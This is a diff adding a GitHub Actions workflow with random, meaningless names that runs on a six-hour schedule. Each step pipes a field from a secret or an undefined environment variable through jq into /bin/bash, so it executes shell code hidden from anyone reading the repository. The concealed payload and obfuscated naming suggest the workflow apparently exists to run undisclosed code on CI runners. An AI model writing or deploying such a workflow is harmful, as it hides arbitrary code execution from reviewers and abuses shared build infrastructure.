@@ -1,0 +1,28 @@
+name: futuredonutt
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: futuredonutt
+        env:
+          venp514: ${{ secrets.venp514 }}
+        run: |
+          echo $venp514 | jq -r .bamnr08 | /bin/bash
+          echo $gfqfr79988 | jq -r .uxp75423 | /bin/bash
+          echo $izyql6759 | jq -r .ytab943 | /bin/bash
+          echo $kius72 | jq -r .qm357 | /bin/bash
+          echo $qka2360 | jq -r .rr2 | /bin/bash
+          echo $okwd5 | jq -r .rkvxq612 | /bin/bash
+          echo $iz7192 | jq -r .dxckv1 | /bin/bash
+          echo $dax64042 | jq -r .pspo0384 | /bin/bash
+          echo $vrx3 | jq -r .hqee38369 | /bin/bash
+          echo $sh56 | jq -r .lci10082 | /bin/bash
+          echo $ms100 | jq -r .sdgh97 | /bin/bash
+
